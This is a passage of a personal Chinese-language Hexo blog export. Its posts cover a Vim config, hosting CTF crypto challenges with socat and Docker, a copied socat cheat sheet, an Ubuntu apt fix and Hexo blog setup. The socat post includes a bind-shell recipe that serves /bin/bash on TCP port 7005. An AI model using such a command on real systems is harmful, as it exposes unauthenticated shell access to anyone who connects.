<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set nocompatible &quot; be iMproved, required</span><br><span class="line">filetype off &quot; required</span><br><span class="line">&quot; set the runtime path to include Vundle and initialize</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">&quot; alternatively, pass a path where Vundle should install plugins</span><br><span class="line">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span><br><span class="line">&quot; let Vundle manage Vundle, required</span><br><span class="line">Plugin &#x27;VundleVim/Vundle.vim&#x27;</span><br><span class="line">Plugin &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plugin &#x27;kien/ctrlp.vim&#x27;</span><br><span class="line">Plugin &#x27;vim-airline/vim-airline&#x27;</span><br><span class="line">Plugin &#x27;jiangmiao/auto-pairs&#x27;</span><br><span class="line">Plugin &#x27;powerline/powerline&#x27;</span><br><span class="line">Plugin &#x27;preservim/nerdcommenter&#x27;</span><br><span class="line">Plugin &#x27;vim-scripts/a.vim&#x27;</span><br><span class="line">call vundle#end() &quot; required</span><br><span class="line">filetype plugin indent on &quot; required</span><br><span class="line"></span><br><span class="line">set nocompatible</span><br><span class="line">set backspace=indent,eol,start</span><br><span class="line"></span><br><span class="line">&quot;激活鼠标</span><br><span class="line">set mouse=a</span><br><span class="line"></span><br><span class="line">&quot;显示行号</span><br><span class="line">set nu</span><br><span class="line"></span><br><span class="line">&quot;设置制表符宽度为4</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置软制表符宽度为4</span><br><span class="line">set softtabstop=4</span><br><span class="line"></span><br><span class="line">&quot;设置缩进的空格数为4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">&quot;设置自动缩进</span><br><span class="line">set autoindent</span><br><span class="line"></span><br><span class="line">&quot;设置使用c/c++语言的自动缩进方式</span><br><span class="line">set cindent</span><br><span class="line"></span><br><span class="line">&quot;tab键宽度</span><br><span class="line">set tabstop=4</span><br><span class="line"></span><br><span class="line">&quot;语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot;主题颜色</span><br><span class="line">colorscheme monokai</span><br><span class="line"></span><br><span class="line">&quot;NERDTree快捷键</span><br><span class="line">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot;NERDTree剩下一个窗口时自动关闭</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTree&quot;) &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br><span class="line"></span><br><span class="line">&quot;ctrlp配置&quot;</span><br><span class="line">set runtimepath^=~/.vim/plugged/ctrlp.vim</span><br><span class="line"></span><br><span class="line">map &lt;leader&gt;r :NERDTreeFind&lt;cr&gt;</span><br><span class="line"></span><br><span class="line">&quot;控制vim窗口分界线位置</span><br><span class="line">map &lt;F2&gt; &lt;ESC&gt;&lt;C-W&gt;-</span><br><span class="line">map &lt;F3&gt; &lt;ESC&gt;&lt;C-W&gt;+</span><br><span class="line">map &lt;F4&gt; &lt;ESC&gt;&lt;C-W&gt;&lt;</span><br><span class="line">map &lt;F5&gt; &lt;ESC&gt;&lt;C-W&gt;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>接下来正式开始</p>
<p>主要参考<a href="https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/">这位师傅的</a>，好吧我是缝合怪</p>
<h2 id="将题目挂到服务器上的一般姿势"><a href="#将题目挂到服务器上的一般姿势" class="headerlink" title="将题目挂到服务器上的一般姿势"></a>将题目挂到服务器上的一般姿势</h2><p><em>一开始我还以为是用nc来挂，然后就在小破站上学了netcat，然后发现好像是用socat，难怪程序员这么喜欢猫</em></p>
<p>一道Crypto题目的搭建主要有两部分，与题目有关的代码文件server.py，以及将程序跑在服务器端口上的代码文件run.py组成</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210913214156007.png" alt="image-20210913214156007"></p>
<p>我暂时接触到的出题模板，题目的python是直接用print的和input的，没有用到socket库；其他的就是题目本身的信息了</p>
<p>然后是启动程序，可以遵循以下模式，可以一直在这个端口运行（端口在运行的时候自己选择，阿里云的服务器是要在工作台开起来先）；还有开启防火墙端口的操作，可以直接看上面这位大师傅的，我一般复现只开一个端口，做一次后面就一劳永逸了好像</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<p>虽然<code>ctrl+c</code>退出就结束了，不是很清楚他们比赛的时候是怎么操作的，每个端口开一个题目难道都要一直挂着？不过目前够我用就行</p>
<h2 id="用Docker打包的姿势"><a href="#用Docker打包的姿势" class="headerlink" title="用Docker打包的姿势"></a>用Docker打包的姿势</h2><p>在没接触过docker之前，觉得写dockerfile好难，这里师傅有模板，我们按照他的做一遍</p>
<p>原理其实差不多，只不过上面是在服务器上配置好了整个程序运行需要的东西，用docker则相当于在服务器上开了个虚拟机，并且通过dockerfile对其进行坏境的配置，将题目放在这个环境中跑</p>
<p>文件夹的结构就是这样的了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000241836.png" alt="image-20210914000241836"></p>
<p>让我们研究下这个dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定制的镜像是基于FROM的镜像，这里是运行python脚本，需要安装一个python，apline是linux操作系统？</span></span><br><span class="line"><span class="comment"># LABEL以键值对的形式添加元数据，似乎是关于作者版本之类的</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Description=<span class="string">&quot;Game&quot;</span> VERSION=<span class="string">&#x27;1.0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN后面紧跟shell命令，和命令行一样方便；还有另一种执行文件跟参数的命令，用到时查</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; apk add gcc g++ make openssl-dev python3-dev libffi-dev autoconf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WORKDIR指定工作目录，mkdir [-p] 确保目录名称存在，不存在的就建一个</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/game</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /opt/game</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制指令，从上下文目录中复制文件或者目录到容器里指定路径，.应该是表示当前目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> task.py .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> secret.py .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># EXPOSE声明端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD在docker run时运行；RUN是在docker build</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;task.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>本地搭建测试</strong></p>
<ol>
<li><p>build镜像<code>docker build . -t wmctf-game</code></p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914000656526.png" alt="image-20210914000656526"></p>
<p>真的好慢，毕竟是在搭环境了，赛方只要搭建一次，以后开新的容器就好</p>
<p>今天晚上没有跑完，明天起来继续</p>
<p>就可慢，连了实验室的网，也要断开几次，重新执行，最后才好</p>
</li>
<li><p><code>docker images</code>查看一下</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101621134.png" alt="image-20210914101621134"></p>
</li>
<li><p>创建一个containter容器<code>docker run --name game -d -p 10001:10001 wmctf-game</code>，-d是run了之后不进入container内部，这样就可以一个窗口开多道题目了吧；-p是将container内部的端口映射到本地的10001端口</p>
<p>不知道返回的那一串东西是什么，想要停止的话可以先<code>docker stop [container id]</code>，然后再删除<code>docker rm [container id]</code></p>
</li>
<li><p><code>docker container ls</code>查看这个容器是否已经运行</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914101715144.png" alt="image-20210914101715144"></p>
</li>
<li><p>最后用exp打，纳尼，exp呢，算了，能连上就成功一半（bushi）</p>
</li>
</ol>
</li>
</ul>
<p>没连上第一次，不知道是不是这里的问题</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210914102947812.png" alt="image-20210914102947812"></p>
<p>连不上自己服务器的端口，然后直接用第一种方法复现CSAW了</p>
<p>不过整个出题过程没有问题，如果把这些拿给赛方，差不多就是这样，我这里还没研究透，等WEB服务上到再来填坑吧</p>
<hr>
<p>害其实话说回来，密码题自己复现完全可以写两个python脚本然后手动交互，没必要这么麻烦，毕竟复现的大多时候flag是自己瞎编的；但是整点仪式感吧，嘿嘿</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Socat</title>
    <url>/posts/bbcb3fe9/</url>
    <content><![CDATA[<p>Socat是Netcat的升级版，所做的工作就是在2个address指定的描述符间建立一个pipe用于发送和接收数据</p>
<span id="more"></span>

<h1 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h1><p>抄的是<a href="https://www.hi-linux.com/posts/61543.html">这篇文章</a>，除了个别用到的，其他没怎么实现过，没有验证过是否正确</p>
<p>先将最实用的，CTF-Crypto出题一般就是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: %s [port]&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">port = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = <span class="string">&#x27;socat -d -d tcp-l:&#x27;</span> + port + <span class="string">&#x27;,reuseaddr,fork EXEC:&quot;python -u server.py&quot; &#x27;</span></span><br><span class="line">os.system(command)</span><br></pre></td></tr></table></figure>

<h2 id="基本的操作"><a href="#基本的操作" class="headerlink" title="基本的操作"></a>基本的操作</h2><h3 id="Socat命令语法"><a href="#Socat命令语法" class="headerlink" title="Socat命令语法"></a>Socat命令语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat [options] &lt;address&gt; &lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>附加选项用逗号隔开</p>
<p>address常见的取值</p>
<ul>
<li><code>-,STDIN,STDOUT</code>：表示标准输入输出，可以就用一个横杠代替。</li>
<li><code>/var/log/syslog</code>：打开一个文件作为数据流，可以是任意路径。</li>
<li><code>TCP:</code>：建立一个 TCP 连接作为数据流，TCP 也可以替换为 UDP 。</li>
<li><code>TCP-LISTEN</code>：建立 一个 TCP 监听端口，TCP 也可以替换为 UDP。</li>
<li><code>EXEC</code>：执行一个程序作为数据流。</li>
</ul>
<h3 id="常见功能实现"><a href="#常见功能实现" class="headerlink" title="常见功能实现"></a>常见功能实现</h3><h4 id="建立相互一个简单的通信"><a href="#建立相互一个简单的通信" class="headerlink" title="建立相互一个简单的通信"></a>建立相互一个简单的通信</h4><ul>
<li>服务器端：<code>socat -TCP4-LISTEN:4440</code></li>
<li>客户端：<code>socat -TCP4:[ip]:[port]</code></li>
</ul>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><ol>
<li><p><strong>读取文件</strong></p>
<ul>
<li><p>绝对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - [absolute address]</span><br></pre></td></tr></table></figure></li>
<li><p>相对路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - ./[relative address]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>写入文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;INPUT_CONTENT&quot; | socat - [address]</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4><ol>
<li><p><strong>连接远程端口</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat - TCP:[ip]:[port]</span><br></pre></td></tr></table></figure></li>
<li><p><strong>监听一个新端口</strong></p>
<p>应该是在链接远程端口的基础上，我猜，或者本地？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:[port] -</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>这个我们用到了，我的理解就是Crypto做nc题目的过程</p>
<ol>
<li><p><strong>转发TCP</strong></p>
<p>监听192.168.1.252网卡的15672端口，并将请求转发至172.17.0.15的15672端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat  -d -d -lf /var/log/socat.log TCP4-LISTEN:15672,bind=192.168.1.252,reuseaddr,fork TCP4:172.17.0.15:15672</span><br></pre></td></tr></table></figure>

<p>其中，</p>
<ul>
<li><code>-d -d</code>：代表调试信息的输出级别，不懂</li>
<li><code>-lf /var/log/socat.log</code>：指定输出信息的文件保存位置</li>
<li><code> TCP4-LISTEN:[port]</code>：在本地建立一个TCP IPv4协议的监听端口</li>
<li><code>bind=[ip]</code>：指定监听绑定的IP地址，不绑定的话将监听服务器上可用的全部IP</li>
<li><code>reuseaddr </code>：绑定一个本地端口</li>
<li><code> fork TCP4:[ip]:[port]</code>：指定要转发到的服务器 IP 和端口</li>
</ul>
</li>
</ol>
<h4 id="传递文件"><a href="#传递文件" class="headerlink" title="传递文件"></a>传递文件</h4><p>将文件demo.tar.gz使用2000端口从192.168.1.252传到192.168.1.253，文件传输完毕后会自动退出</p>
<p>在192.168.1.252上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u open:demo.tar.gz tcp-listen:2000,reuseaddr</span><br></pre></td></tr></table></figure>

<p>在192.168.1.253上执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat -u tcp:192.168.1.252:2000 open:demo.tar.gz,create</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-u</code>：数据传输模式从左到右单向</li>
<li><code>-U</code>：数据传输模式从右到左单向</li>
</ul>
<p>还可以<strong>读写分流</strong></p>
<h4 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h4><ul>
<li><p>建立一个正向shell</p>
<p><strong>服务端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在服务端 7005 端口建立一个 Shellsocat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr或socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr</span></span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接到服务器的 7005 端口，即可获得一个 Shell。readline 是 GNU 的命令行编辑器，具有历史功能socat readline tcp:127.0.0.1:7005</span></span><br></pre></td></tr></table></figure>

<p><em>不太懂，像但并不完全像</em></p>
</li>
</ul>
<ul>
<li><p><strong>让 Socat 后台运行</strong></p>
<p>这个挺好</p>
<p>在命令行最前面加一个<code>nohup</code>命令</p>
</li>
</ul>
<p>最重要的还是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nohup socat -d -d tcp-l:[port],reuseaddr,fork EXEC:python -u server.py</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>ubuntu软件更新失败解决</title>
    <url>/posts/ade40a32/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="ubuntu软件更新失败解决"><a href="#ubuntu软件更新失败解决" class="headerlink" title="ubuntu软件更新失败解决"></a>ubuntu软件更新失败解决</h1><p>才知道之前那么多次<code>apt update</code>一直是失败，报这样的错</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003101535464.png" alt="image-20211003101535464" style="zoom: 80%;" />

<p>此外还会报<code>Certificate verification failed: The certificate is NOT trusted.</code>的错误</p>
<p>具体原因没有深究，可能是源的问题</p>
<ul>
<li><p><strong>证书问题</strong></p>
<p>直接编辑源的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>将<code>https</code>替换成<code>http</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<p>进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p>安装证书</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ca-certificates</span><br></pre></td></tr></table></figure>

<p>显然<code>http</code>是不安全的，所有的数据包都会被监听，但不知道为什么阿里源都是<code>http</code>；总之在成功过后，还是把<code>http</code>替换回<code>https</code></p>
<p>最后再进行一次更新</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
<li><p><strong>没有Release文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /etc/apt/sources.list.d</span><br></pre></td></tr></table></figure>

<p>删除这个文件，有别的文件，我也不知道可不可以删，反正我一般就是这个<br><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003102507534.png" alt="image-20211003102507534"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rm fcitx-team-ubuntu-nightly-bionic.list</span><br></pre></td></tr></table></figure>

<p>最后更新一下，成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
      </categories>
  </entry>
  <entry>
    <title>如何用hexo搭建博客</title>
    <url>/posts/ed1adb0c/</url>
    <content><![CDATA[<p>马上就能拥有自己的博客了，开不开心，激不激动；我用的是</p>
<ul>
<li>ubuntu18，处于windows的子系统</li>
<li>hexo是5.4.0</li>
<li>因为NexT主题比较成熟，所以先拿这个练练手，是8.8.0版本的</li>
</ul>
<p>更多信息可以在<a href="https://hexo.io/zh-cn/docs/">官网文档</a>查询，此外还看了<a href="https://www.bilibili.com/video/BV1Yb411a7ty/?spm_id_from=333.788.recommend_more_video.0">b站up主的超级良心视频</a></p>
<span id="more"></span>
<h1 id="如何用hexo搭建博客"><a href="#如何用hexo搭建博客" class="headerlink" title="如何用hexo搭建博客"></a>如何用hexo搭建博客</h1><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><h3 id="一、安装git和node-js"><a href="#一、安装git和node-js" class="headerlink" title="一、安装git和node.js"></a>一、安装git和node.js</h3><p><a href="http://git-scm.com/download/linux">git</a>，我要最新的，更新遇到的问题可以参考<a href="https://4xwi11.github.io/posts/ade40a32/">我的ubuntu软件更新失败解决</a></p>
<p><a href="https://github.com/nodesource/distributions">node.js</a>，就用长期支持的14版本吧</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003233927033.png" alt="image-20211003233927033"></p>
<p>最后检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<h3 id="二、安装hexo"><a href="#二、安装hexo" class="headerlink" title="二、安装hexo"></a>二、安装hexo</h3><p>可能遇到错误，我直接<code>sudo</code>可解决</p>
<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>这个命令会一起安装hexo的命令，所以能在命令行直接敲太香了</p>
<p>添加到环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo &#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27; &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure>

<p>这样以后直接用<code>hexo + 命令</code>就可以了</p>
<h2 id="搭站"><a href="#搭站" class="headerlink" title="搭站"></a>搭站</h2><p>首先，初始化hexo最基本的文件到我们本地的目录，最后一个是文件名自己取，比如我就叫<code>4XWi11</code>，放我自己的 博客</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init 4XWi11</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 4XWi11;npm install</span><br></pre></td></tr></table></figure>

<p>生成网站页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g[enerator]</span><br></pre></td></tr></table></figure>

<p>可以看到生成了一个<code>public</code>的文件，就是我们生成的网站目录</p>
<p>打开这个网页，启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s[erver]</span><br></pre></td></tr></table></figure>

<p>当然一开始是本地的</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
<li><p>新建文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;BLOG_TITLE&quot;</span><br></pre></td></tr></table></figure>

<p>其实就是新建了一个md文件</p>
</li>
<li><p>进行博客编辑</p>
</li>
<li><p>重新生成启动</p>
<p>再次运行<code>g</code>和<code>s</code>命令</p>
</li>
</ul>
<p>可惜可惜，和github一样不支持latex</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>这里用Git部署</p>
<p>所以当然最最开始需要在github上有一个创库，<strong>注意：仓库的命名一定要是USER_NAME.github.io</strong>，比如我的就是<code>4XWi11.github.io</code>，后续浏览器可以直接访问</p>
<p>安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>如果不确定插件是否已经安装，可以用下条命令检测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm list hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>然后更改<code>_config.yml</code>文件的选项，设置部署在<code>git</code>上，并给出仓库地址</p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>完成部署</p>
<p>遇到了密码不匹配的问题，要在输入密码的地方输入token</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171639758.png" alt="image-20211003171639758"></p>
<p>勾选</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171714542.png" alt="image-20211003171714542"></p>
<p>生成将token复制到需要填密码的地方即可</p>
<p>但是我又遇到上述操作做完还是认证失败的情况</p>
<p>然后把仓库删了重新创建一遍就好了，但总不能更新一遍就删掉重来吧</p>
<p><em>我知道了，不告诉你们，我再也不乱动方向盘了</em></p>
<p>但是后面还可能出现连不上github的情况，开关一下代理有时候可以解决</p>
<p>可是不知道是不是子系统的原因，我以为它会帮我自动记忆，没想到每次都要手输，看看之后有没有好的解决办法</p>
<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><p>这里我跟着<a href="https://theme-materialized.github.io/how-to-build-a-hexo-blog/">materialized作者的博客</a>，一起来尝试NexT主题的配置</p>
<p>首先当然是把主题从github下载下来，放在themes目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h3 id="换图标的问题"><a href="#换图标的问题" class="headerlink" title="换图标的问题"></a>换图标的问题</h3><p>图标来自<a href="https://fontawesome.com/v5.15/icons?d=gallery&p=2">FontAwesome</a></p>
<p>图标的名称，建议点开那个图标，你会发现名称的全称</p>
<h3 id="设置评论的问题"><a href="#设置评论的问题" class="headerlink" title="设置评论的问题"></a>设置评论的问题</h3><p>没有评论的博客是没有灵魂的，但是NexT8.8不支持内置valine</p>
<p>废了废了</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141656383.png" alt="image-20211006141656383"></p>
<p>这个等配置好latex再来配置吧</p>
<hr>
<p>最后决定用utterances了，配置方便，也不用挂梯子，只要有一个github账号，师傅们就可以找我玩啦</p>
<p>怎么配置可以看<a href="https://jasper1024.com/jasper/968d55ac/#languages-yml">这位师傅的</a></p>
<h3 id="代码主题"><a href="#代码主题" class="headerlink" title="代码主题"></a>代码主题</h3><p>首先选择引擎</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141448204.png" alt="image-20211006141448204" style="zoom:50%;" />

<p>然后再选主题</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141336676.png" alt="image-20211006141336676" style="zoom:50%;" />

<p>这里可以预览<a href="https://theme-next.js.org/highlight/">https://theme-next.js.org/highlight/</a></p>
<h3 id="latex"><a href="#latex" class="headerlink" title="latex"></a>latex</h3><p>新版本的缺点就是网上的教程比较难找，但是我把这些全部开起来就可以了</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095926085.png" alt="image-20211007095926085" style="zoom:67%;" />

<p>还很nice得自动在居中公式后面加上了标号，可以好好利用</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095954761.png" alt="image-20211007095954761" style="zoom:67%;" />

<h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>我跟着<a href="https://hxhowl.com/posts/e6f9a475/">这篇博客</a>做的</p>
<h3 id="更改字体颜色"><a href="#更改字体颜色" class="headerlink" title="更改字体颜色"></a>更改字体颜色</h3><p>因为换了背景可能有footer的颜色看不清，看这位<a href="https://blog.csdn.net/weixin_40837922/article/details/88047241">师傅的</a>改了下颜色</p>
<h3 id="更改字体大小"><a href="#更改字体大小" class="headerlink" title="更改字体大小"></a>更改字体大小</h3><p>16px有点小大，喜欢殷实一点的，我这个版本在这里调，前面有一大推东西，直接拉到最后em那里改就好</p>
<img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007114800161.png" alt="image-20211007114800161" style="zoom:67%;" />

<h3 id="吉祥物"><a href="#吉祥物" class="headerlink" title="吉祥物"></a>吉祥物</h3><p>跟着上面背景图片的师傅搞了下，先用他的wanko，但看到这只狗觉得好爱哈哈哈，暂时就不换别的了（其他的都是二刺螈（doge））</p>
<hr>
<p>行吧，就这样吧，能用就行</p>
<p>花了几天时间搞花头，都是平面化学习，以后更应该专注于博客质量了</p>
]]></content>
      <categories>
        <category>关于操作的一些问题</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>从这里开始的</tag>
      </tags>
  </entry>
</search>
